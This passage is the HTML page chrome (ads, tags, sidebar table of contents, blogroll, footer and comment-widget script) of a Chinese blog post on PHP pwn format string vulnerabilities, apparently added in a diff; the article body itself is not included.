+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="2524986173"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 页面嵌入广告 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="3413388404"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag"># 学习记录</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/12/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B8%80/" rel="prev" title="php pwn学习入门一 (基础环境搭建)">
+      <i class="fa fa-chevron-left"></i> php pwn学习入门一 (基础环境搭建)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/12/11/idapython%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" rel="next" title="idapython使用笔记">
+      idapython使用笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-pwn学习入门二-格式化字符串漏洞"><span class="nav-number">1.</span> <span class="nav-text">php pwn学习入门二 (格式化字符串漏洞)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#从可变参函数谈起"><span class="nav-number">1.1.</span> <span class="nav-text">从可变参函数谈起</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php中的格式化字符串函数"><span class="nav-number">1.2.</span> <span class="nav-text">php中的格式化字符串函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ogeek-check-in-writeup"><span class="nav-number">1.3.</span> <span class="nav-text">ogeek check_in writeup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文献"><span class="nav-number">1.4.</span> <span class="nav-text">参考文献</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wonderkun"
+      src="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+  <p class="site-author-name" itemprop="name">wonderkun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wonderkun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wonderkun" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/729173164@qq.com" title="E-Mail → 729173164@qq.com"><i class="QQ fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https:&#x2F;&#x2F;www.leavesongs.com&#x2F;" rel="noopener" target="_blank">phithon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.bertramc.cn/" title="https:&#x2F;&#x2F;www.bertramc.cn&#x2F;" rel="noopener" target="_blank">berTrAM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;" rel="noopener" target="_blank">l3m0n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yulegeyu.com/" title="http:&#x2F;&#x2F;www.yulegeyu.com&#x2F;" rel="noopener" target="_blank">雨神</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.wupco.cn/" title="http:&#x2F;&#x2F;www.wupco.cn&#x2F;" rel="noopener" target="_blank">wupco</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bendawang.site/" title="http:&#x2F;&#x2F;www.bendawang.site&#x2F;" rel="noopener" target="_blank">bendawang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pcat.cnblogs.com/" title="http:&#x2F;&#x2F;pcat.cnblogs.com&#x2F;" rel="noopener" target="_blank">pcat</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yqxiaojunjie.com/" title="http:&#x2F;&#x2F;www.yqxiaojunjie.com&#x2F;" rel="noopener" target="_blank">乐清小俊杰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lorexxar.cn/" title="https:&#x2F;&#x2F;lorexxar.cn&#x2F;" rel="noopener" target="_blank">LoRexxar</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pupiles.com/" title="http:&#x2F;&#x2F;pupiles.com&#x2F;" rel="noopener" target="_blank">Pupil</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bywalks.com/" title="http:&#x2F;&#x2F;www.bywalks.com&#x2F;" rel="noopener" target="_blank">bywalks</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://chybeta.github.io/" title="https:&#x2F;&#x2F;chybeta.github.io&#x2F;" rel="noopener" target="_blank">chybeta</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.evalbug.com/" title="http:&#x2F;&#x2F;blog.evalbug.com&#x2F;" rel="noopener" target="_blank">yan表哥</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pav1.cc/wordpress/" title="http:&#x2F;&#x2F;pav1.cc&#x2F;wordpress&#x2F;" rel="noopener" target="_blank">Pav1师傅</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.smi1e.top/" title="https:&#x2F;&#x2F;www.smi1e.top&#x2F;" rel="noopener" target="_blank">smi1e</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://afang5472.blogspot.com/" title="https:&#x2F;&#x2F;afang5472.blogspot.com&#x2F;" rel="noopener" target="_blank">afang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://rebirthwyw.com/" title="https:&#x2F;&#x2F;rebirthwyw.com&#x2F;" rel="noopener" target="_blank">rebirthwyw</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ww9210.cn/" title="https:&#x2F;&#x2F;ww9210.cn&#x2F;" rel="noopener" target="_blank">ww9210</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://magicbluech.github.io/" title="https:&#x2F;&#x2F;magicbluech.github.io&#x2F;" rel="noopener" target="_blank">magicbluech</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://d1nn3r.github.io/" title="https:&#x2F;&#x2F;d1nn3r.github.io&#x2F;" rel="noopener" target="_blank">d1nn3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.rai4over.cn/" title="http:&#x2F;&#x2F;www.rai4over.cn&#x2F;" rel="noopener" target="_blank">rai4over</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备17014925号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wonderkun</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/fancybox/jquery.min.js"></script>
+  <script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'T7sfFTnT9P1YS302SrmgIa3m-gzGzoHsz',
+      appKey     : 'WfIozMe5BYlmjQ5VMPJpu4G2',
+      placeholder: "ヾﾉ≧∀≦)o来啊，尽情吐槽啊!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
